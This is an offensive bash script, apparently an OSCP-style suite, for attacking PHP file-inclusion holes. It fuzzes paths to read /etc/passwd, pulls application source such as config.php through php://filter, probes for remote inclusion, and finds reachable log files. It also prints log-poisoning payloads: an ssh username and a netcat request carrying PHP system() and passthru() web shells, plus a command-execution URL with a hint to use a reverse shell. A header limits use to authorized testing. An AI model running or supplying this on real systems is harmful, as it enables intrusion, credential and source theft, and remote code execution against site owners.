#!/bin/bash

# Re-exec under bash if started with sh/dash (arrays & [[ ]] need bash).
if [ -z "$BASH_VERSION" ]; then exec bash "$0" "$@"; fi

# ==============================================================================
# Advanced OSCP LFI, RFI, Wrapper & Log Poisoning Suite
# Wordlist: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
#
# For use only against systems you are explicitly authorized to test
# (OSCP labs, the exam, your own machines, engagements with written scope).
# ==============================================================================

WORDLIST="/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"

# Defaults for the log-poisoning module (override with flags, see usage)
CMD_PARAM="cmd"          # GET param used in the suggested poisoning commands
ONLY_LOG=""              # if set, only check this one log path
MAXDEPTH=12              # how many ../ levels to brute force (fallback)
VERBOSE=0
CONFIRMED_PREFIXES=()    # traversal prefixes that proved LFI in Phase 1

# Help Function
usage() {
    echo "=============================================================================="
    echo " OSCP Advanced LFI, RFI, Wrapper & Log Poisoning Suite"
    echo "=============================================================================="
    echo " Usage: $0 <URL_with_FUZZ> [options]"
    echo ""
    echo " Arguments:"
    echo "   URL_with_FUZZ   The vulnerable URL containing 'FUZZ' where the payload goes."
    echo ""
    echo " Options:"
    echo "   -p, --param NAME     GET param used in the suggested poisoning cmds (default: cmd)"
    echo "   -L, --log PATH       Only check this one log path (e.g. /var/log/apache2/access.log)"
    echo "   -d, --depth N        Max ../ traversal depth to brute force (default: 12)"
    echo "   -v, --verbose        Print every URL tried (use this to debug)"
    echo "   -h, --help           Display this help message and exit"
    echo ""
    echo " Examples:"
    echo "   $0 'http://10.10.10.X/vuln.php?page=FUZZ'"
    echo "   $0 'http://10.10.10.X/vuln.php?page=FUZZ' -L /var/log/apache2/access.log -v"
    echo "=============================================================================="
    exit 0
}

# Check for -h or --help flags, or missing arguments
if [[ "$#" -eq 0 || "$1" == "-h" || "$1" == "--help" ]]; then
    usage
fi

URL="$1"
shift

# Parse optional flags
while [[ "$#" -gt 0 ]]; do
    case "$1" in
        -p|--param)   CMD_PARAM="$2"; shift 2 ;;
        -L|--log)     ONLY_LOG="$2"; shift 2 ;;
        -d|--depth)   MAXDEPTH="$2"; shift 2 ;;
        -v|--verbose) VERBOSE=1; shift ;;
        -h|--help)    usage ;;
        *) echo "[-] Unknown option: $1"; usage ;;
    esac
done

# Helper: build a full target URL by substituting FUZZ (or appending)
build_target() {
    local payload="$1"
    if [[ "$URL" == *"FUZZ"* ]]; then
        echo "${URL//FUZZ/$payload}"
    else
        echo "${URL}${payload}"
    fi
}

# Helper: given a log path, emit candidate inclusion strings to try.
# This is the key fix: we do NOT assume one traversal form. We try the
# absolute path, every ../ depth, .php-suffix bypasses (null byte + truncation),
# and a php://filter read, so a log that's really there gets found.
log_candidates() {
    local log="$1"
    local rel="${log#/}"           # strip leading slash for relative forms
    local d prefix p
    # 1) FIRST: the exact traversal prefixes that confirmed LFI in Phase 1.
    #    Whatever reached ../../../../etc/passwd reaches the log the same way,
    #    including encoded (..%2f) or filtered (....//) variants.
    for p in "${CONFIRMED_PREFIXES[@]}"; do
        printf '%s\n' "${p}${rel}"
        printf '%s\n' "${p}${rel}%00"
    done
    # 2) absolute path, plus .php-suffix bypasses
    printf '%s\n' "$log"
    printf '%s\n' "${log}%00"       # null byte (old PHP) to drop an appended .php
    printf '%s\n' "${log}%2300"     # encoded '#' truncation
    # 3) php://filter read — confirms readability even when include() would execute
    printf '%s\n' "php://filter/convert.base64-encode/resource=${log}"
    # 4) FALLBACK: brute force ../ traversal depths
    for ((d=1; d<=MAXDEPTH; d++)); do
        prefix=$(printf '../%.0s' $(seq 1 "$d"))
        printf '%s\n' "${prefix}${rel}"
        printf '%s\n' "${prefix}${rel}%00"
    done
}

# Check if Seclists wordlist exists (only needed for Phase 1 fuzzing)
if [ ! -f "$WORDLIST" ] && [ -z "$ONLY_LOG" ]; then
    echo "[-] Wordlist not found at $WORDLIST. Verify your SecLists installation."
    exit 1
fi

echo "[+] Starting LFI and Vulnerability Suite on: $URL"
echo "=================================================="

# ------------------------------------------------------------------------------
# 1. Standard LFI Fuzzing Loop (/etc/passwd)   [skipped when -L is used]
# ------------------------------------------------------------------------------
if [[ -z "$ONLY_LOG" ]]; then
echo "[+] Phase 1: Fuzzing for Local File Inclusion (LFI)..."
while IFS= read -r payload; do
    [[ -z "$payload" || "$payload" =~ ^# ]] && continue
    target="$(build_target "$payload")"
    response=$(curl -s -L "$target")
    if echo "$response" | grep -q "root:x:0:0:"; then
        echo "[!] SUCCESS: LFI Detected!"
        echo "    -> Payload: $payload"
        echo "    -> Target URL: $target"
        # Record the traversal prefix (everything before 'etc/passwd') so
        # Phase 4 reaches the logs at the same confirmed level.
        if [[ "$payload" == *etc/passwd* ]]; then
            prefix="${payload%%etc/passwd*}"
            # avoid storing duplicates
            if [[ -n "$prefix" ]] && [[ ! " ${CONFIRMED_PREFIXES[*]} " == *" $prefix "* ]]; then
                CONFIRMED_PREFIXES+=("$prefix")
                echo "    -> Confirmed traversal prefix saved for log poisoning: '$prefix'"
            fi
        fi
        echo "--------------------------------------------------"
    fi
done < "$WORDLIST"
echo "[+] Phase 1 Complete."
echo "=================================================="

# ------------------------------------------------------------------------------
# 2. PHP Wrapper Testing (php://filter source code disclosure)
# ------------------------------------------------------------------------------
echo "[+] Phase 2: Testing PHP Wrappers (php://filter)..."
WRAPPER_FILES=("index.php" "config.php" "login.php" "db.php")
for file in "${WRAPPER_FILES[@]}"; do
    wrapper_payload="php://filter/convert.base64-encode/resource=$file"
    w_target="$(build_target "$wrapper_payload")"
    w_resp=$(curl -s -L "$w_target")
    if [[ ${#w_resp} -gt 50 ]] && [[ "$w_resp" =~ ^[a-zA-Z0-9+/=]+$ ]]; then
        echo "[!] SUCCESS: Wrapper Source Code Disclosure Found!"
        echo "    -> File Target: $file"
        echo "    -> Target URL: $w_target"
        echo "    -> Base64 Output Snippet: ${w_resp:0:60}..."
        echo "    -> Decode with: echo '<base64>' | base64 -d"
        echo "--------------------------------------------------"
    fi
done
echo "[+] Phase 2 Complete."
echo "=================================================="

# ------------------------------------------------------------------------------
# 3. Remote File Inclusion (RFI) Testing
# ------------------------------------------------------------------------------
echo "[+] Phase 3: Testing Remote File Inclusion (RFI)..."
RFI_TEST_URL="https://www.google.com"
rfi_target="$(build_target "$RFI_TEST_URL")"
echo "[*] Testing if target fetches external content from: $RFI_TEST_URL"
rfi_resp=$(curl -s -L "$rfi_target")
if echo "$rfi_resp" | grep -q -E "Google|<html|<!DOCTYPE html>"; then
    echo "[!] CRITICAL SUCCESS: RFI / External URL Inclusion Detected!"
    echo "    -> Target URL: $rfi_target"
    echo "    -> Action: host your own webshell and pass it to the parameter."
    echo "--------------------------------------------------"
else
    echo "[-] RFI check failed (allow_url_include / allow_url_fopen likely Off)."
fi
echo "[+] Phase 3 Complete."
echo "=================================================="
fi

# ------------------------------------------------------------------------------
# 4. Log Poisoning (LFI -> RCE)
#    A: poison the log (User-Agent for web logs, SSH username for auth.log)
#    B: brute force the inclusion path (depths + .php bypasses + wrapper)
#    C: distinguish RCE from "readable but PHP not executing"
# ------------------------------------------------------------------------------
echo "[+] Phase 4: Log Reachability Check (log-poisoning candidates)..."
echo "[*] param='$CMD_PARAM'  maxdepth=$MAXDEPTH  (detection-only: suggests, does not inject)"
if [[ "${#CONFIRMED_PREFIXES[@]}" -gt 0 ]]; then
    echo "[*] Reusing confirmed LFI prefixes first: ${CONFIRMED_PREFIXES[*]}"
else
    echo "[*] No confirmed prefix from Phase 1; relying on brute-forced depths."
fi

if [[ -n "$ONLY_LOG" ]]; then
    LOG_PATHS=("$ONLY_LOG")
else
    LOG_PATHS=(
        "/var/log/apache2/access.log"
        "/var/log/apache2/error.log"
        "/var/log/apache/access.log"
        "/var/log/httpd/access_log"
        "/var/log/nginx/access.log"
        "/var/log/nginx/error.log"
        "/var/log/auth.log"
        "/var/log/secure"
        "/var/log/vsftpd.log"
        "/var/log/mail.log"
    )
fi

# Phase 4 is detection-only: it checks whether each log file is reachable
# through the LFI and, when it is, PRINTS a ready-to-run log-poisoning
# suggestion. It does not inject payloads or run commands on the target.
WEB_ROOT="${URL%%\?*}"   # query stripped, used in the suggested poison request
# Host for the suggested netcat poison. IMPORTANT: the log you include belongs to
# the web service on its OWN port (commonly 80) and that may differ from the port
# the LFI app runs on. Poison the service that actually writes the log you read.
_hp="${URL#*://}"; _hp="${_hp%%/*}"
POISON_HOST="${_hp%%:*}"
REF_URL="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning"
reachable_any=0

# Fingerprints that indicate we are genuinely seeing log contents
LOG_SIG='GET /|POST /|HTTP/1\.[01]|Mozilla/|sshd\[|pam_unix|invalid user|\[client |\[error\]'

for log in "${LOG_PATHS[@]}"; do
    echo "[*] --- Checking reachability: $log ---"
    found=0
    hitpath=""
    while IFS= read -r cand; do
        ctarget="$(build_target "$cand")"
        [[ "$VERBOSE" -eq 1 ]] && echo "    [try] $ctarget"
        resp=$(curl -s -L "$ctarget")

        # php://filter candidate: readable if it returns a base64 blob
        if [[ "$cand" == php://filter* ]]; then
            if [[ ${#resp} -gt 50 ]] && echo "$resp" | tr -d '\n' | grep -qE '^[A-Za-z0-9+/=[:space:]]+$'; then
                echo "[!] REACHABLE (readable via php://filter): $log"
                echo "    -> Read it: curl -s '$ctarget' | base64 -d"
                found=1; hitpath="$ctarget"; break
            fi
            continue
        fi

        # direct include: reachable if the response contains log content
        if echo "$resp" | grep -qE "$LOG_SIG"; then
            echo "[!] REACHABLE (log contents returned via LFI): $log"
            echo "    -> Include URL: $ctarget"
            found=1; hitpath="$ctarget"; break
        fi
    done < <(log_candidates "$log")

    if [[ "$found" -eq 1 ]]; then
        reachable_any=1
        # Build a suggested execute-URL from the path that actually worked
        if [[ "$hitpath" == *"?"* ]]; then
            exec_suggest="${hitpath}&${CMD_PARAM}=id"
        else
            exec_suggest="${hitpath}?${CMD_PARAM}=id"
        fi
        echo "    [SUGGESTION] Log is reachable -> log poisoning may yield RCE. To try it:"
        case "$log" in
            *auth.log|*secure)
                echo "      1) Poison auth.log with a failed SSH login (the username is logged):"
                echo "         ssh \"<?php system(\\\$_GET['${CMD_PARAM}']); ?>\"@<target-ip>"
                ;;
            *)
                echo "      1) Poison via the REQUEST LINE with netcat (nc avoids URL-encoding"
                echo "         the PHP tags). Send it to the web service whose log you're"
                echo "         reading - usually PORT 80, which may NOT be the LFI app's port:"
                echo "         echo \"GET /<?php passthru(\\\$_GET['${CMD_PARAM}']); ?> HTTP/1.1\" | nc -nv ${POISON_HOST} 80"
                echo "         (Use SINGLE quotes in the payload: Apache escapes \" in the logged"
                echo "          request line as \\\", which breaks PHP parsing; ' is left as-is.)"
                echo "         (User-Agent poisoning via 'curl -A' only lands if Apache LogFormat"
                echo "          is 'combined'; the request-line method also works with 'common'.)"
                ;;
        esac
        echo "      2) Include the poisoned log and run a command:"
        echo "         curl -s '$exec_suggest'"
        echo "         (swap 'id' for whoami etc.; for a shell pass a reverse-shell one-liner)"
        echo "      Ref: $REF_URL"
    else
        echo "    -> Not reachable at the tried paths (raise -d, try -v, or check the vhost path)."
    fi
    echo "--------------------------------------------------"
done

[[ "$reachable_any" -eq 0 ]] && echo "[-] No reachable log files found."
echo "[+] Phase 4 Complete."
echo "=================================================="
echo "[+] Scan finished completely. Good luck"
